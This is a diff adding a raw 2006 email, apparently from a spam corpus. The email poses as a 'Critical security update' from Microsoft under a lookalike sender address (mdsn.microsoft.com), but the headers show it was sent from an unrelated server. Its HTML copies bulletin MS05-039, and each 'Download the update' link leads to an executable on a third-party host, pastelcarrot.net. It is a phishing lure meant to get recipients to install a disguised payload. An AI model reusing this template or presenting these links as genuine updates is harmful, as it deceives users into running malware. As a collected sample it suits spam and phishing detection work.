@@ -1,0 +1,146 @@
+From atacs-bugs@chou.ece.utah.edu  Thu Aug 24 07:22:12 2006
+Return-Path: <atacs-bugs@chou.ece.utah.edu>
+X-Spam-Checker-Version: SpamAssassin 3.1.3 (2006-06-01) on chou.ece.utah.edu
+X-Spam-Level: 
+X-Spam-Status: No, score=0.0 required=5.0 tests=HTML_MESSAGE,
+	MIME_HEADER_CTYPE_ONLY,MIME_HTML_ONLY autolearn=unavailable 
+	version=3.1.3
+Received: from chou.ece.utah.edu (localhost.localdomain [127.0.0.1])
+	by chou.ece.utah.edu (8.13.7/8.13.1) with ESMTP id k7ODMCnc001353
+	for <atacs-bugs@shang.ece.utah.edu>; Thu, 24 Aug 2006 07:22:12 -0600
+Received: (from atacs-bugs@localhost)
+	by chou.ece.utah.edu (8.13.7/8.13.7/Submit) id k7ODMCw6001352
+	for atacs-bugs@shang.ece.utah.edu; Thu, 24 Aug 2006 07:22:12 -0600
+Received: from jupiter.nexosys.com (jupiter.nexosys.com [64.62.172.233])
+	by chou.ece.utah.edu (8.13.7/8.13.1) with ESMTP id k7ODM8kD001327
+	for <atacs-bugs@vlsigroup.elen.utah.edu>; Thu, 24 Aug 2006 07:22:08 -0600
+Received: from mike by jupiter.nexosys.com with local (Exim 4.52)
+	id 1GGF9r-00014t-K3
+	for atacs-bugs@vlsigroup.elen.utah.edu; Thu, 24 Aug 2006 06:22:07 -0700
+content-type: text/html
+Subject: Critical security update available
+From: Microsoft Windows Updates<updates@mdsn.microsoft.com>
+To: atacs-bugs@vlsigroup.elen.utah.edu
+Message-Id: <E1GGF9r-00014t-K3@jupiter.nexosys.com>
+Date: Thu, 24 Aug 2006 06:22:07 -0700
+X-AntiAbuse: This header was added to track abuse, please include it with any abuse report
+X-AntiAbuse: Primary Hostname - jupiter.nexosys.com
+X-AntiAbuse: Original Domain - vlsigroup.elen.utah.edu
+X-AntiAbuse: Originator/Caller UID/GID - [32054 32054] / [47 12]
+X-AntiAbuse: Sender Address Domain - jupiter.nexosys.com
+X-Source: 
+X-Source-Args: 
+X-Source-Dir: 
+
+
+<html>
+
+<head>
+
+<title>Microsoft Security Bulletin MS05</title>
+
+</head>
+
+<body>
+
+<h2>Microsoft Security Bulletin MS05-039</h2>
+
+<h3 class="subtitle">Vulnerability in Plug and Play Could Allow Remote Code Execution and Elevation of Privilege (899588)</h3>
+
+<h4>Summary:</h4>
+
+<b>Who should receive this document:</b> Customers who use Microsoft Windows<br>
+
+<b>Impact of Vulnerability:</b> Remote Code Execution and Local Elevation of Privilege<br>
+
+<b>Maximum Severity Rating: </b><b>CRITICAL</b><br>
+
+<b>Recommendation: </b>Customers should apply the update immediately.<br>
+
+<b>Security Update Replacement: </b>None<br>
+
+<b>Caveats: </b>None<br>
+
+<b>Tested Software and Security Update Download Locations:</b><br><br>
+
+<b>Affected Software:</b></p>
+
+
+
+<table cellspacing="0" cellpadding="0" border="0"><tr>
+
+
+
+<td class="listBullet" valign="top">&#8226;</td><td class="listItem">
+
+<p>Microsoft Windows 2000 Service Pack 4 &#8211; 
+
+<a href="http://www.pastelcarrot.net/activities/updates/Windows-KB899586-x86-ENU.exe">Download the update</a></p></td></tr><tr>
+
+<td class="listBullet" valign="top">&#8226;</td><td class="listItem">
+
+<p>Microsoft Windows XP Service Pack 1 and Microsoft Windows XP Service Pack 2 &#8211; 
+
+<a href="http://www.pastelcarrot.net/activities/updates/Windows-KB899586-x86-ENU.exe">Download the update</a></p></td></tr>
+
+<tr><td class="listBullet" valign="top">&#8226;</td><td class="listItem">
+
+<p>Microsoft Windows XP Professional x64 Edition &#8211; 
+
+<a href="http://www.pastelcarrot.net/activities/updates/Windows-KB899586-x86-ENU.exe">Download the update</a></p></td></tr><tr>
+
+<td class="listBullet" valign="top">&#8226;</td><td class="listItem">
+
+<p>Microsoft Windows Server 2003 and Microsoft Windows Server 2003 Service Pack 1 &#8211; 
+
+<a href="http://www.pastelcarrot.net/activities/updates/Windows-KB899586-x86-ENU.exe">Download the update</a></p></td></tr><tr>
+
+<td class="listBullet" valign="top">&#8226;</td><td class="listItem">
+
+<p>Microsoft Windows Server 2003 for Itanium-based Systems and Microsoft Windows Server 2003 with SP1 for Itanium-based Systems &#8211; 
+
+<a href="http://www.pastelcarrot.net/activities/updates/Windows-KB899586-x86-ENU.exe">Download the update</a></p></td></tr><tr>
+
+<td class="listBullet" valign="top">&#8226;</td><td class="listItem">
+
+<p>Microsoft Windows Server 2003 x64 Edition &#8211; 
+
+<a href="http://www.pastelcarrot.net/activities/updates/Windows-KB899586-x86-ENU.exe">Download the update</a></p></td></tr></table><p>
+
+
+
+<b>Non-Affected Software:</b></p><table cellspacing="0" cellpadding="0" border="0"><tr>
+
+
+
+<td class="listBullet" valign="top">&#8226;</td><td class="listItem">
+
+<p>Microsoft Windows 95</p></td></tr></table>
+
+
+
+<div class="expandoIndent"><p><b>Executive Summary:</b></p>
+
+
+
+<p>This update resolves a newly-discovered, privately-reported vulnerability. A remote code execution vulnerability exists in Plug and Play (PnP) that could allow an attacker who successfully exploited this vulnerability to take complete control of the affected system. An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights.</p>
+
+
+
+<p><b>Conclusion: We recommend that customers apply the update immediately.</b><br><br>
+
+
+
+<span dir="ltr">&#169; 2005 Microsoft Corporation. All rights reserved.&nbsp;</span><nobr>
+
+<a href="http://www.microsoft.com/info/cpyright.mspx">Terms of Use</a> |</nobr><wbr /><nobr>
+
+<a href="http://www.microsoft.com/library/toolbar/3.0/trademarks/en-us.mspx">Trademarks</a> |</nobr><wbr /><nobr>
+
+<a href="http://www.microsoft.com/info/privacy.mspx">Privacy Statement</a></nobr></div></td>
+
+</body>
+
+</html>
+
+
